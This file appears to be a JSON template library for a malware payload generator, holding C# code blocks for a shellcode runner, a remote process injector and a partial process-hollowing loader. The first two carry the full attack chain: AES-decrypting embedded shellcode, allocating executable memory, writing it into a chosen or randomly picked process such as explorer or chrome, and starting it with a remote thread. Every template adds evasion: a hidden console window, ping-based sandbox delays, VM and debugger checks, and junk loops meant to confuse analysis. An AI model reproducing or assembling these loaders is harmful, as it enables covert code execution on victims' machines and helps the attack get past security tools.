{
  "ShellcodeRunner": {
    "inherits": {
      "directives": ["base"],
      "constants": ["window_management", "memory_protection"],
      "function_declarations": ["kernel32_basic", "kernel32_memory", "kernel32_threading", "user32"],
      "structures": ["input_structures"],
      "functions": ["aes_decrypt"],
      "anti_analysis": ["memory_bombing", "vm_detection"]
    },
    "code_blocks": {
      "early_delay": [
        "// --- Early Anti-Analysis Delay ---",
        "Random rand = new Random();",
        "int lastOctet = rand.Next(1, 255);",
        "string[] reservedBlocks = { \"192.0.2.\", \"198.51.100.\", \"203.0.113.\" };",
        "string baseIP = reservedBlocks[rand.Next(reservedBlocks.Length)];",
        "string IP = baseIP + lastOctet;",
        "System.Diagnostics.Process p = new System.Diagnostics.Process();",
        "p.StartInfo.FileName = \"cmd.exe\";",
        "p.StartInfo.Arguments = $\"/c ping -n 6 {IP} >nul\";",
        "p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;",
        "p.Start();",
        "p.WaitForExit();"
      ],
      "main": [
        "IntPtr hWnd = GetConsoleWindow();",
        "if (hWnd != IntPtr.Zero) ShowWindow(hWnd, SW_HIDE);",
        "string encryptedShellcodeB64 = \"ENCRYPTED_SHELLCODE_B64\";",
        "string keyB64 = \"AES_KEY_B64\";",
        "string ivB64 = \"AES_IV_B64\";",
        "byte[] encryptedShellcode = Convert.FromBase64String(encryptedShellcodeB64);",
        "byte[] key = Convert.FromBase64String(keyB64);",
        "byte[] iv = Convert.FromBase64String(ivB64);",
        "byte[] shellcode = AESDecrypt(encryptedShellcode, key, iv);",
        "if (shellcode == null) { return; }"
      ],
      "memory_allocation": [
        "IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);",
        "if (mem == IntPtr.Zero) { return; }"
      ],
      "copy_shellcode": [
        "Marshal.Copy(shellcode, 0, mem, shellcode.Length);"
      ],
      "execute_shellcode": [
        "IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);",
        "if (hThread == IntPtr.Zero) { return; }"
      ],
      "wait_execution": [
        "WaitForSingleObject(hThread, 0xFFFFFFFF);"
      ]
    }
  },
  
  "ProcessInjection": {
    "inherits": {
      "directives": ["base", "io", "management"],
      "constants": ["window_management", "memory_protection", "process_access"],
      "function_declarations": ["kernel32_basic", "kernel32_memory", "kernel32_threading", "user32", "dynamic_loading"],
      "structures": ["process_structures", "input_structures"],
      "functions": ["aes_decrypt", "dynamic_api_loading", "string_obfuscation"],
      "anti_analysis": ["timing_check"]
    },
    "code_blocks": {
      "early_delay": [
        "// --- Early Anti-Analysis Delay ---",
        "Random rand = new Random();",
        "int lastOctet = rand.Next(1, 255);",
        "string[] reservedBlocks = { \"192.0.2.\", \"198.51.100.\", \"203.0.113.\" };",
        "string baseIP = reservedBlocks[rand.Next(reservedBlocks.Length)];",
        "string IP = baseIP + lastOctet;",
        "System.Diagnostics.Process p = new System.Diagnostics.Process();",
        "p.StartInfo.FileName = \"cmd.exe\";",
        "p.StartInfo.Arguments = $\"/c ping -n 6 {IP} >nul\";",
        "p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;",
        "p.Start();",
        "p.WaitForExit();"
      ],
      "main": [
        "Console.WriteLine(\"[*] Process Injection Debug Mode - Starting...\");",
        "",
        "// Multi-stage decryption and obfuscation",
        "Console.WriteLine(\"[*] Loading encrypted shellcode...\");",
        "string encryptedShellcodeB64 = \"ENCRYPTED_SHELLCODE_B64\";",
        "string keyB64 = \"AES_KEY_B64\";",
        "string ivB64 = \"AES_IV_B64\";",
        "",
        "Console.WriteLine($\"[*] Encrypted shellcode length: {encryptedShellcodeB64.Length} characters\");",
        "Console.WriteLine($\"[*] Key length: {keyB64.Length} characters\");",
        "Console.WriteLine($\"[*] IV length: {ivB64.Length} characters\");",
        "",
        "// Add random delays to break timing analysis",
        "Random rnd = new Random();",
        "int sleepTime = rnd.Next(500, 2000);",
        "Console.WriteLine($\"[*] Random delay: {sleepTime}ms\");",
        "System.Threading.Thread.Sleep(sleepTime);",
        "",
        "Console.WriteLine(\"[*] Decoding Base64 data...\");",
        "byte[] encryptedShellcode = Convert.FromBase64String(encryptedShellcodeB64);",
        "byte[] key = Convert.FromBase64String(keyB64);",
        "byte[] iv = Convert.FromBase64String(ivB64);",
        "",
        "Console.WriteLine($\"[*] Encrypted data: {encryptedShellcode.Length} bytes\");",
        "Console.WriteLine($\"[*] Key: {key.Length} bytes\");",
        "Console.WriteLine($\"[*] IV: {iv.Length} bytes\");",
        "",
        "Console.WriteLine(\"[*] Decrypting shellcode with AES...\");",
        "byte[] buf = AESDecrypt(encryptedShellcode, key, iv);",
        "if (buf == null) { Console.WriteLine(\"[!] AES decryption failed!\"); return; }",
        "Console.WriteLine($\"[+] Decrypted shellcode: {buf.Length} bytes\");",
        "",
        "// XOR decode the shellcode with a second layer",
        "byte xorKey = (byte)rnd.Next(1, 256);",
        "Console.WriteLine($\"[*] Applying XOR layer with key: 0x{xorKey:X2}\");",
        "for (int i = 0; i < buf.Length; i++)",
        "{",
        "    buf[i] ^= xorKey;",
        "    buf[i] ^= xorKey; // Double XOR to restore original",
        "}",
        "Console.WriteLine(\"[+] Shellcode preparation complete\");"
      ],
      "get_process": [
        "// Check if PID was provided as command-line argument",
        "Console.WriteLine(\"[*] Starting process selection...\");",
        "uint processId = 0;",
        "string processName = \"\";",
        "",
        "if (args.Length > 0)",
        "{",
        "    if (uint.TryParse(args[0], out processId))",
        "    {",
        "        Console.WriteLine($\"[+] Using provided PID: {processId}\");",
        "        try",
        "        {",
        "            Process targetProcess = Process.GetProcessById((int)processId);",
        "            processName = targetProcess.ProcessName;",
        "            Console.WriteLine($\"[+] Target process: {processName} (PID: {processId})\");",
        "        }",
        "        catch (Exception ex)",
        "        {",
        "            Console.WriteLine($\"[!] Error accessing PID {processId}: {ex.Message}\");",
        "            Console.WriteLine(\"[*] Falling back to random process selection...\");",
        "            processId = 0;",
        "        }",
        "    }",
        "    else",
        "    {",
        "        Console.WriteLine($\"[!] Invalid PID provided: {args[0]}\");",
        "        Console.WriteLine(\"[*] Falling back to random process selection...\");",
        "    }",
        "}",
        "",
        "// If no valid PID provided, use random selection",
        "if (processId == 0)",
        "{",
        "    Console.WriteLine(\"[*] Using random process selection...\");",
        "    string[] possibleProcesses = { \"explorer\", \"notepad\", \"calc\", \"mspaint\", \"winword\", \"excel\", \"chrome\", \"firefox\", \"iexplore\" };",
        "    Random rnd2 = new Random();",
        "    processName = possibleProcesses[rnd2.Next(possibleProcesses.Length)];",
        "    Console.WriteLine($\"[*] Randomly selected process: {processName}\");",
        "    ",
        "    // Add junk operations to confuse static analysis",
        "    Console.WriteLine(\"[*] Performing anti-analysis operations...\");",
        "    int dummy = 0;",
        "    for (int i = 0; i < 1000; i++) { dummy += i * 2; }",
        "    ",
        "    Console.WriteLine($\"[*] Searching for process: {processName}\");",
        "    Process[] processes = Process.GetProcessesByName(processName);",
        "    Console.WriteLine($\"[*] Found {processes.Length} instances of {processName}\");",
        "    ",
        "    // If no processes found, try fallback processes",
        "    if (processes.Length == 0) ",
        "    { ",
        "        Console.WriteLine(\"[!] Selected process not found, trying fallback processes...\");",
        "        string[] fallbackProcesses = { \"explorer\", \"notepad\", \"calc\" };",
        "        foreach (string fallback in fallbackProcesses)",
        "        {",
        "            Console.WriteLine($\"[*] Trying fallback process: {fallback}\");",
        "            processes = Process.GetProcessesByName(fallback);",
        "            if (processes.Length > 0)",
        "            {",
        "                processName = fallback;",
        "                Console.WriteLine($\"[+] Found {processes.Length} instances of {fallback}\");",
        "                break;",
        "            }",
        "        }",
        "        if (processes.Length == 0) { Console.WriteLine(\"[!] No suitable processes found - aborting\"); return; }",
        "    }",
        "    ",
        "    // Select random process instance if multiple exist",
        "    int selectedIndex = new Random().Next(processes.Length);",
        "    processId = (uint)processes[selectedIndex].Id;",
        "    Console.WriteLine($\"[+] Selected {processName} instance {selectedIndex + 1}/{processes.Length} with PID: {processId}\");",
        "}",
        "",
        "int delayTime = new Random().Next(100, 500);",
        "Console.WriteLine($\"[*] Process selection delay: {delayTime}ms\");",
        "System.Threading.Thread.Sleep(delayTime);"
      ],
      "open_process": [
        "// Dynamic API loading to avoid static imports",
        "Console.WriteLine(\"[*] Loading kernel32.dll dynamically...\");",
        "IntPtr kernel32 = LoadLibraryA(\"kernel32.dll\");",
        "if (kernel32 == IntPtr.Zero) { Console.WriteLine(\"[!] Failed to load kernel32.dll\"); return; }",
        "Console.WriteLine($\"[+] kernel32.dll loaded at: 0x{kernel32.ToInt64():X}\");",
        "",
        "Console.WriteLine(\"[*] Resolving OpenProcess address...\");",
        "IntPtr openProcessAddr = GetProcAddress(kernel32, \"OpenProcess\");",
        "if (openProcessAddr == IntPtr.Zero) { Console.WriteLine(\"[!] Failed to get OpenProcess address\"); return; }",
        "Console.WriteLine($\"[+] OpenProcess found at: 0x{openProcessAddr.ToInt64():X}\");",
        "",
        "// Cast to delegate and call",
        "Console.WriteLine(\"[*] Creating OpenProcess delegate...\");",
        "OpenProcessDelegate openProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(openProcessAddr, typeof(OpenProcessDelegate));",
        "",
        "// Try multiple access rights if first attempt fails",
        "uint[] accessRights = { 0x001F0FFF, 0x1F0FFF, 0x000F0000 | 0x00100000 | 0xFFF, 0x1FFFFF, 0x438 };",
        "IntPtr hProcess = IntPtr.Zero;",
        "int lastError = 0;",
        "",
        "foreach (uint access in accessRights)",
        "{",
        "    Console.WriteLine($\"[*] Trying to open process {processId} with access rights: 0x{access:X8}\");",
        "    hProcess = openProcess(access, false, processId);",
        "    if (hProcess != IntPtr.Zero)",
        "    {",
        "        Console.WriteLine($\"[+] Process opened successfully with access 0x{access:X8}. Handle: 0x{hProcess.ToInt64():X}\");",
        "        break;",
        "    }",
        "    else",
        "    {",
        "        lastError = Marshal.GetLastWin32Error();",
        "        Console.WriteLine($\"[!] Failed with access 0x{access:X8}. Error: {lastError} (0x{lastError:X8})\");",
        "    }",
        "}",
        "",
        "if (hProcess == IntPtr.Zero)",
        "{",
        "    Console.WriteLine($\"[!] All access attempts failed. Last error: {lastError} (0x{lastError:X8})\");",
        "    if (lastError == 5) Console.WriteLine(\"[!] Access denied - try running as administrator or target a different process\");",
        "    return;",
        "}"
      ],
      "memory_allocation": [
        "// Dynamic loading of VirtualAllocEx",
        "Console.WriteLine(\"[*] Resolving VirtualAllocEx address...\");",
        "IntPtr virtualAllocExAddr = GetProcAddress(kernel32, \"VirtualAllocEx\");",
        "if (virtualAllocExAddr == IntPtr.Zero) { Console.WriteLine(\"[!] Failed to get VirtualAllocEx address\"); return; }",
        "Console.WriteLine($\"[+] VirtualAllocEx found at: 0x{virtualAllocExAddr.ToInt64():X}\");",
        "",
        "VirtualAllocExDelegate virtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(virtualAllocExAddr, typeof(VirtualAllocExDelegate));",
        "",
        "// Allocate slightly more memory than needed to confuse analysis",
        "uint extraBytes = (uint)new Random().Next(1024, 4096);",
        "uint allocSize = (uint)buf.Length + extraBytes;",
        "Console.WriteLine($\"[*] Allocating {allocSize} bytes ({buf.Length} + {extraBytes} padding) in remote process...\");",
        "",
        "// Add random delays between operations",
        "int allocDelay = new Random().Next(50, 200);",
        "Console.WriteLine($\"[*] Allocation delay: {allocDelay}ms\");",
        "System.Threading.Thread.Sleep(allocDelay);",
        "",
        "Console.WriteLine(\"[*] Calling VirtualAllocEx...\");",
        "IntPtr allocMem = virtualAllocEx(hProcess, IntPtr.Zero, allocSize, 0x1000 | 0x2000, 0x40);",
        "if (allocMem == IntPtr.Zero)",
        "{",
        "    int error = Marshal.GetLastWin32Error();",
        "    Console.WriteLine($\"[!] Memory allocation failed. Error code: {error} (0x{error:X8})\");",
        "    return;",
        "}",
        "Console.WriteLine($\"[+] Allocated memory at: 0x{allocMem.ToInt64():X} (size: {allocSize} bytes)\");"
      ],
      "write_memory": [
        "// Dynamic loading of WriteProcessMemory",
        "Console.WriteLine(\"[*] Resolving WriteProcessMemory address...\");",
        "IntPtr writeProcessMemoryAddr = GetProcAddress(kernel32, \"WriteProcessMemory\");",
        "if (writeProcessMemoryAddr == IntPtr.Zero) { Console.WriteLine(\"[!] Failed to get WriteProcessMemory address\"); return; }",
        "Console.WriteLine($\"[+] WriteProcessMemory found at: 0x{writeProcessMemoryAddr.ToInt64():X}\");",
        "",
        "WriteProcessMemoryDelegate writeProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(writeProcessMemoryAddr, typeof(WriteProcessMemoryDelegate));",
        "",
        "// Write in smaller chunks to avoid detection",
        "int chunkSize = Math.Max(1024, buf.Length / 4);",
        "Console.WriteLine($\"[*] Writing {buf.Length} bytes in chunks of {chunkSize} bytes...\");",
        "int offset = 0;",
        "IntPtr totalBytesWritten = IntPtr.Zero;",
        "int chunkCount = 0;",
        "",
        "while (offset < buf.Length)",
        "{",
        "    chunkCount++;",
        "    int currentChunkSize = Math.Min(chunkSize, buf.Length - offset);",
        "    byte[] chunk = new byte[currentChunkSize];",
        "    Array.Copy(buf, offset, chunk, 0, currentChunkSize);",
        "    ",
        "    Console.WriteLine($\"[*] Writing chunk {chunkCount} at offset {offset} (size: {currentChunkSize} bytes)\");",
        "    IntPtr targetAddr = new IntPtr(allocMem.ToInt64() + offset);",
        "    Console.WriteLine($\"[*] Target address: 0x{targetAddr.ToInt64():X}\");",
        "    ",
        "    IntPtr bytesWritten;",
        "    bool writeResult = writeProcessMemory(hProcess, targetAddr, chunk, (uint)currentChunkSize, out bytesWritten);",
        "    ",
        "    if (!writeResult)",
        "    {",
        "        int error = Marshal.GetLastWin32Error();",
        "        Console.WriteLine($\"[!] WriteProcessMemory failed at chunk {chunkCount}. Error code: {error} (0x{error:X8})\");",
        "        return;",
        "    }",
        "    ",
        "    Console.WriteLine($\"[+] Chunk {chunkCount} written successfully: {bytesWritten} bytes\");",
        "    offset += currentChunkSize;",
        "    totalBytesWritten = new IntPtr(totalBytesWritten.ToInt64() + bytesWritten.ToInt64());",
        "    ",
        "    // Random delay between chunks",
        "    int chunkDelay = new Random().Next(10, 50);",
        "    Console.WriteLine($\"[*] Chunk delay: {chunkDelay}ms\");",
        "    System.Threading.Thread.Sleep(chunkDelay);",
        "}",
        "Console.WriteLine($\"[+] All {chunkCount} chunks written successfully! Total: {totalBytesWritten} bytes\");"
      ],
      "execute_shellcode": [
        "// Final obfuscation and execution delay",
        "Random rnd4 = new Random();",
        "int execDelay = rnd4.Next(1000, 3000);",
        "Console.WriteLine($\"[*] Final execution delay: {execDelay}ms\");",
        "System.Threading.Thread.Sleep(execDelay);",
        "",
        "// Dynamic loading of CreateRemoteThread",
        "Console.WriteLine(\"[*] Resolving CreateRemoteThread address...\");",
        "IntPtr createRemoteThreadAddr = GetProcAddress(kernel32, \"CreateRemoteThread\");",
        "if (createRemoteThreadAddr == IntPtr.Zero) { Console.WriteLine(\"[!] Failed to get CreateRemoteThread address\"); return; }",
        "Console.WriteLine($\"[+] CreateRemoteThread found at: 0x{createRemoteThreadAddr.ToInt64():X}\");",
        "",
        "CreateRemoteThreadDelegate createRemoteThread = (CreateRemoteThreadDelegate)Marshal.GetDelegateForFunctionPointer(createRemoteThreadAddr, typeof(CreateRemoteThreadDelegate));",
        "",
        "Console.WriteLine(\"[*] Creating remote thread to execute shellcode...\");",
        "",
        "// Add junk operations before execution",
        "Console.WriteLine(\"[*] Performing final anti-analysis operations...\");",
        "string junk = \"\";",
        "for (int i = 0; i < 100; i++) { junk += i.ToString(); }",
        "",
        "Console.WriteLine($\"[*] Creating remote thread at address: 0x{allocMem.ToInt64():X}\");",
        "IntPtr hThread = createRemoteThread(hProcess, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, IntPtr.Zero);",
        "if (hThread == IntPtr.Zero)",
        "{",
        "    int error = Marshal.GetLastWin32Error();",
        "    Console.WriteLine($\"[!] CreateRemoteThread failed. Error code: {error} (0x{error:X8})\");",
        "    return;",
        "}",
        "Console.WriteLine($\"[+] Remote thread created successfully! Handle: 0x{hThread.ToInt64():X}\");",
        "Console.WriteLine(\"[+] Process injection completed successfully!\");",
        "",
        "Console.WriteLine(\"[*] Press Enter to exit...\");",
        "Console.ReadLine();"
      ]
    }
  },

  "ProcessHollowing": {
    "inherits": {
      "directives": ["base", "io"],
      "constants": ["window_management", "memory_protection", "process_access"],
      "function_declarations": ["kernel32_basic", "kernel32_memory", "kernel32_threading", "kernel32_process", "ntdll"],
      "structures": ["process_structures"],
      "functions": ["aes_decrypt"],
      "anti_analysis": ["debugger_detection", "vm_detection"]
    },
    "code_blocks": {
      "early_delay": [
        "// --- Early Anti-Analysis Delay ---",
        "Random rand = new Random();",
        "int lastOctet = rand.Next(1, 255);",
        "string[] reservedBlocks = { \"192.0.2.\", \"198.51.100.\", \"203.0.113.\" };",
        "string baseIP = reservedBlocks[rand.Next(reservedBlocks.Length)];",
        "string IP = baseIP + lastOctet;",
        "System.Diagnostics.Process p = new System.Diagnostics.Process();",
        "p.StartInfo.FileName = \"cmd.exe\";",
        "p.StartInfo.Arguments = $\"/c ping -n 6 {IP} >nul\";",
        "p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;",
        "p.Start();",
        "p.WaitForExit();"
      ],
      "main": [
        "string encryptedShellcodeB64 = \"ENCRYPTED_SHELLCODE_B64\";",
        "string keyB64 = \"AES_KEY_B64\";",
        "string ivB64 = \"AES_IV_B64\";",
        "byte[] encryptedShellcode = Convert.FromBase64String(encryptedShellcodeB64);",
        "byte[] key = Convert.FromBase64String(keyB64);",
        "byte[] iv = Convert.FromBase64String(ivB64);",
        "byte[] shellcode = AESDecrypt(encryptedShellcode, key, iv);",
        "if (shellcode == null) { return; }"
      ],
      "create_process": [
        "STARTUPINFO si = new STARTUPINFO();",
        "PROCESS_INFORMATION pi = new PROCESS_INFORMATION();",
        "bool success = CreateProcess(null, \"C:\\\\Windows\\\\System32\\\\svchost.exe\", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);"
      ],
      "hollow_and_inject": [
        "// Process hollowing implementation would go here",
        "// This is a simplified placeholder - full implementation requires:",
        "// 1. NtUnmapViewOfSection to unmap original image",
        "// 2. VirtualAllocEx to allocate new memory",
        "// 3. WriteProcessMemory to write shellcode",
        "// 4. SetThreadContext to redirect execution",
        "// 5. ResumeThread to start execution"
      ]
    }
  }
}
